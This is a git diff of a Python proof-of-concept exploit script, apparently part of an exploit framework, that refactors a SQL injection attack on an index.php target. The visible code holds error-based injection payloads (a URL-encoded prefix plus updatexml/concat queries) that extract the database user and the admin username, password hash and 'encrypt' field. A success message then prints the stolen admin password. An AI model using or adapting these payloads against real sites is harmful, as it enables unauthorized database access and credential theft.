@@ -1,18 +1,12 @@
-import sys
-import urllib
-
 import requests
 
-from lib.core.data import target
+from plugin.component.check import url_check
+from plugin.component.shell import shell
 
 
-def poc():
+def poc(url):
     try:
-        if not target.url.endswith("index.php"):
-            print("[*] Please make sure the url end with 'index.php'")
-            exit()
-        url = target.url
-
+        url_check(url, "index.php")
         sqli_prefix = '%*27an*d%20'
         sqli_info = 'updatexml(1,concat(1,(user())),1)'
         sqli_password1 = 'updatexml(1,concat(1,(select concat(0x6368796265746124,username,0x3a,password,0x3a,encrypt,0x6368796265746124) from '
@@ -60,7 +54,7 @@ def poc():
         admin_passwd = html[startIndex:endIndex]
         print("[+] Get User Passwd: " + admin_passwd)
 
-    except KeyError as e:
+    except Exception:
 
         print(
             "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
